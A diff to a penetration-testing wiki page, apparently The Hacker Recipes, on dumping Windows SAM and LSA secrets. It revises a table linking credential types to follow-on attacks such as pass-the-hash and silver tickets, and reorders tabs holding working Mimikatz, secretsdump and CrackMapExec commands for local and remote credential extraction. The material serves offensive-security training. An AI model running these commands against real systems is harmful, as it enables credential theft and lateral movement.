@@ -47,9 +47,9 @@ SAM and LSA secrets can be dumped either locally or remotely from the mounted re
 | Credential material | Subsequent attacks |
 | :--- | :--- |
 | Plaintext passwords | [credential spraying](../bruteforcing/password-spraying.md), [stuffing](../bruteforcing/stuffing.md), [shuffling](../credential-shuffling.md) or [silver tickets](../../abusing-kerberos/forged-tickets.md) |
-| LM/NT hashes | [credential spraying](../bruteforcing/password-spraying.md), [stuffing](../bruteforcing/stuffing.md), [shuffling](../credential-shuffling.md), [cracking](../cracking.md), [pass-the-hash](../../abusing-lm-and-ntlm/pass-the-hash.md), [overpass-the-hash](../../abusing-kerberos/pass-the-key.md) or [silver tickets](../../abusing-kerberos/forged-tickets.md) |
-| Kerberos keys \(RC4\) | [credential cracking](../cracking.md), [pass-the-hash](../../abusing-lm-and-ntlm/pass-the-hash.md), [overpass-the-hash](../../abusing-kerberos/pass-the-key.md), [pass-the-key](../../abusing-kerberos/pass-the-key.md) or [silver tickets](../../abusing-kerberos/forged-tickets.md) |
-| Kerberos keys \(DES, AES\) | [credential cracking](../cracking.md) |
+| LM and NT hashes | [credential spraying](../bruteforcing/password-spraying.md), [stuffing](../bruteforcing/stuffing.md), [shuffling](../credential-shuffling.md), [cracking](../cracking.md), [pass-the-hash](../../abusing-lm-and-ntlm/pass-the-hash.md) |
+| Kerberos keys \(RC4, i.e. == NT hash\) | [credential cracking](../cracking.md), [overpass-the-hash](../../abusing-kerberos/pass-the-key.md) or [silver tickets](../../abusing-kerberos/forged-tickets.md) |
+| Kerberos keys \(DES, AES\) | [credential cracking](../cracking.md), [pass-the-key](../../abusing-kerberos/pass-the-key.md) or [silver tickets](../../abusing-kerberos/forged-tickets.md) |
 | Domain Cached Credentials \(DCC1 or DCC2\) | [credential cracking](../cracking.md) |
 
 ## Practice
@@ -81,24 +81,6 @@ Hives files can also be exfiltrated from live systems using [Volume Shadow Copy]
 Here are some examples and tools that can be used for local/remote/offline dumping.
 
 {% tabs %}
-{% tab title="Mimikatz" %}
-[Mimikatz](https://github.com/gentilkiwi/mimikatz) can be used locally to extract credentials from `SAM` and `SECURITY` registry hives \(and `SYSTEM` for the encryption keys\), or offline with hive dumps.
-
-```bash
-# Local dumping of SAM secrets on the target
-lsadump::sam
-
-# Offline dumping of SAM secrets from exported hives
-lsadump::sam /sam:'C:\path\to\sam.save' /system:'C:\path\to\system.save'
-
-# Local dumping of LSA secrets on the target
-lsadump::secrets
-
-# Offline dumping LSA secrets from exported hives
-lsadump::secrets /security:'C:\path\to\security.save' /system:'C:\path\to\system.save'
-```
-{% endtab %}
-
 {% tab title="secretsdump" %}
 [Impacket](https://github.com/SecureAuthCorp/impacket)'s [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) \(Python\) can be used to dump SAM and LSA secrets, either remotely, or from local files. For remote dumping, several authentication methods can be used like [pass-the-hash](../../abusing-lm-and-ntlm/pass-the-hash.md) \(NTLM\), or [pass-the-ticket](../../abusing-kerberos/pass-the-ticket.md) \(Kerberos\).
 
@@ -138,6 +120,24 @@ crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --sam/--lsa
 
 # Remote dumping of SAM/LSA secrets (pass-the-ticket)
 crackmapexec smb $TARGETS --kerberos --sam/--lsa
+```
+{% endtab %}
+
+{% tab title="Mimikatz" %}
+[Mimikatz](https://github.com/gentilkiwi/mimikatz) can be used locally to extract credentials from `SAM` and `SECURITY` registry hives \(and `SYSTEM` for the encryption keys\), or offline with hive dumps.
+
+```bash
+# Local dumping of SAM secrets on the target
+lsadump::sam
+
+# Offline dumping of SAM secrets from exported hives
+lsadump::sam /sam:'C:\path\to\sam.save' /system:'C:\path\to\system.save'
+
+# Local dumping of LSA secrets on the target
+lsadump::secrets
+
+# Offline dumping LSA secrets from exported hives
+lsadump::secrets /security:'C:\path\to\security.save' /system:'C:\path\to\system.save'
 ```
 {% endtab %}
 {% endtabs %}
